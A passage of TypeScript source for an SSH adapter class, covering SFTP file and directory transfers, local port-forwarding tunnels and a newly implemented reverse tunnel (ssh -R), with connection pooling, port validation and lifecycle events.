    if (!this.sshConfig.sftp.enabled) throw new AdapterError(this.adapterName, 'sftp', new Error('SFTP is disabled'));
    if (options.signal?.aborted) throw new DOMException('SFTP operation cancelled', 'AbortError');
    const connection = await this.getConnection(target);
    try {
      return await connection.ssh.withSFTP(sftp => operation(connection.ssh, sftp), options);
    } catch (error) {
      throw new AdapterError(this.adapterName, 'sftp', error instanceof Error ? error : new Error(String(error)));
    } finally {
      this.releaseConnection(connection);
    }
  }

  async uploadFile(localPath: string, remotePath: string, target: SSHAdapterOptions, options: SSHFileTransferOptions = {}): Promise<void> {
    await this.withTransfer(target, options, (ssh, sftp) => ssh.putFile(localPath, remotePath, sftp, options.transferOptions));
  }

  async downloadFile(remotePath: string, localPath: string, target: SSHAdapterOptions, options: SSHFileTransferOptions = {}): Promise<void> {
    await this.withTransfer(target, options, (ssh, sftp) => ssh.getFile(localPath, remotePath, sftp, options.transferOptions));
  }

  private async transferDirectory(direction: 'putDirectory' | 'getDirectory', localPath: string, remotePath: string,
    target: SSHAdapterOptions, options: SSHDirectoryTransferOptions): Promise<void> {
    await this.withTransfer(target, options, async (ssh, sftp) => {
      const failures: Error[] = [];
      const complete = await ssh[direction](localPath, remotePath, {
        concurrency: this.sshConfig.sftp.concurrency, ...options, sftp,
        tick: (local, remote, error) => { if (error) failures.push(error); options.tick?.(local, remote, error); },
      });
      if (!complete) {
        if (failures.length === 1) throw failures[0];
        throw new AggregateError(failures, 'SSH directory transfer was not completed');
      }
    });
  }

  async uploadDirectory(localPath: string, remotePath: string, target: SSHAdapterOptions, options: SSHDirectoryTransferOptions = {}): Promise<void> {
    await this.transferDirectory('putDirectory', localPath, remotePath, target, options);
  }

  async downloadDirectory(remotePath: string, localPath: string, target: SSHAdapterOptions, options: SSHDirectoryTransferOptions = {}): Promise<void> {
    await this.transferDirectory('getDirectory', localPath, remotePath, target, options);
  }

  /** @deprecated Use tunnel() with explicit target options; both return an owned listener. */
  async portForward(localPort: number, remoteHost: string, remotePort: number, options: SSHAdapterOptions) {
    return this.tunnel({ localPort, remoteHost, remotePort }, options);
  }

  /**
   * Create an SSH tunnel with lifecycle management
   * @param options - Tunnel options
   * @returns SSH tunnel instance
   */
  async tunnel(options: {
    localPort?: number;
    localHost?: string;
    remoteHost: string;
    remotePort: number;
  }, target: SSHAdapterOptions): Promise<{
    localPort: number;
    localHost: string;
    remoteHost: string;
    remotePort: number;
    isOpen: boolean;
    closed: Promise<void>;
    open: () => Promise<void>;
    close: () => Promise<void>;
  }> {
    const sshOptions = target;
    if (!sshOptions) {
      throw new AdapterError(this.adapterName, 'tunnel', new Error('An explicit SSH target is required; use a host-bound SSH context or pass connection options.'));
    }

    const connection = await this.getConnection(sshOptions);

    // A tunnel owns the pooled connection until every forwarded socket closes.
    let tunnelResult: Awaited<ReturnType<NodeSSH['createTunnel']>>;
    try {
      tunnelResult = await connection.ssh.createTunnel(options);
    } catch (error) {
      this.releaseConnection(connection);
      throw error;
    }

    // Generate ID for tracking
    const tunnelId = randomBytes(16).toString('hex');

    // Create tunnel object with proper state management
    let isOpen = true;
    let closePromise: Promise<void> | undefined;
    const release = () => {
      if (!isOpen) return;
      isOpen = false;
      this.releaseConnection(connection);
      this.activeTunnels.delete(tunnelId);
      this.emitAdapterEvent('ssh:tunnel-closed', {
        localPort: tunnelResult.localPort,
        remoteHost: options.remoteHost,
        remotePort: options.remotePort
      });
    };
    // Also release the lease when the SSH transport closes the tunnel itself.
    void tunnelResult.closed.then(release);
    const tunnel = {
      localPort: tunnelResult.localPort,
      localHost: tunnelResult.localHost,
      remoteHost: tunnelResult.remoteHost,
      remotePort: tunnelResult.remotePort,
      get isOpen() {
        return isOpen;
      },
      open: async () => {
        // Already opened when created
      },
      closed: tunnelResult.closed,
      close: () => {
        closePromise ??= tunnelResult.close().then(release).catch(error => { closePromise = undefined; throw error; });
        return closePromise;
      }
    };

    // Track the tunnel
    this.activeTunnels.set(tunnelId, tunnel);

    // Emit SSH-specific tunnel created event
    this.emitAdapterEvent('ssh:tunnel-created', {
      localPort: tunnelResult.localPort,
      remoteHost: options.remoteHost,
      remotePort: options.remotePort
    });

    // Emit generic tunnel created event
    this.emitAdapterEvent('tunnel:created', {
      localPort: tunnelResult.localPort,
      remoteHost: options.remoteHost,
      remotePort: options.remotePort,
      type: 'ssh'
    });

    return tunnel;
  }

  /**
   * Open a reverse tunnel: the remote host listens, and each connection is
   * forwarded to a local address.
   *
   * This is `ssh -R`. The CLI advertised a `--reverse` flag for it while the
   * implementation threw 'not yet implemented', so the option existed only as
   * a promise.
   *
   * @param options - Remote listening address and the local destination.
   *   A `remotePort` of 0 asks the server to choose a free port, which is
   *   returned in the result.
   * @returns The bound remote port and a `close` that unbinds it.
   * @throws {AdapterError} If an explicit SSH target is missing.
   *
   * @example
   * ```typescript
   * const tunnel = await adapter.reverseTunnel({
   *   remotePort: 8080,
   *   localHost: 'localhost',
   *   localPort: 3000,
   * }, { type: 'ssh', host: 'bastion.example.com', username: 'deploy' });
   * // Traffic to the server's :8080 now reaches localhost:3000.
   * await tunnel.close();
   * ```
   */
  async reverseTunnel(options: {
    remotePort: number;
    remoteHost?: string;
    localHost?: string;
    localPort: number;
    timeoutMs?: number;
    signal?: AbortSignal;
  }, target: SSHAdapterOptions): Promise<{
    remotePort: number;
    remoteHost: string;
    localHost: string;
    localPort: number;
    isOpen: boolean;
    closed: Promise<void>;
    close: () => Promise<void>;
  }> {
    const sshOptions = target;
    if (!sshOptions) {
      throw new AdapterError(this.adapterName, 'reverseTunnel',
        new Error('An explicit SSH target is required; use a host-bound SSH context or pass connection options.'));
    }
    if (!Number.isInteger(options.localPort) || options.localPort < 1 || options.localPort > 65535 ||
        !Number.isInteger(options.remotePort) || options.remotePort < 0 || options.remotePort > 65535) {
      throw new AdapterError(this.adapterName, 'reverseTunnel', new Error('Invalid tunnel port'));
    }
    const connection = await this.getConnection(sshOptions, options, true);
    const remoteHost = options.remoteHost ?? '127.0.0.1';
    const localHost = options.localHost ?? 'localhost';
    const bridges = new Set<ReturnType<typeof netConnect>>();
    let forwarded: Awaited<ReturnType<NodeSSH['forwardIn']>>;
    try {
      forwarded = await connection.ssh.forwardIn(remoteHost, options.remotePort, (_details, accept) => {
        const channel = accept();
        const local = netConnect(options.localPort, localHost);
        bridges.add(local);
        local.once('connect', () => { channel.pipe(local).pipe(channel); });
        local.on('error', () => { channel.destroy(); });
        local.once('close', () => { bridges.delete(local); channel.destroy(); });
        channel.on('error', () => { local.destroy(); });
        channel.once('close', () => { local.destroy(); });
      }, options);
    } catch (error) {
      this.releaseConnection(connection);
      for (const socket of bridges) socket.destroy();
      throw error;
    }
    const tunnelId = randomBytes(16).toString('hex');
    let isOpen = true;
    let closePromise: Promise<void> | undefined;
    const release = () => {
      if (!isOpen) return;
      isOpen = false;
      for (const socket of bridges) socket.destroy();
      bridges.clear();
      this.releaseConnection(connection);
      this.activeTunnels.delete(tunnelId);
      this.emitAdapterEvent('ssh:tunnel-closed', {
        localPort: options.localPort, remoteHost, remotePort: forwarded.port,
      });
    };
    void forwarded.closed.then(release);
    const tunnel = {
      remotePort: forwarded.port, remoteHost, localHost, localPort: options.localPort,
      get isOpen() { return isOpen; },
      closed: forwarded.closed,
      close: () => {
        if (!isOpen) return Promise.resolve();
        closePromise ??= forwarded.dispose().then(release).catch(error => { closePromise = undefined; throw error; });
        return closePromise;
      },
    };
    this.activeTunnels.set(tunnelId, tunnel);
    this.emitAdapterEvent('ssh:tunnel-created', {
      localPort: options.localPort, remoteHost, remotePort: forwarded.port,
    });
    return tunnel;
  }

}
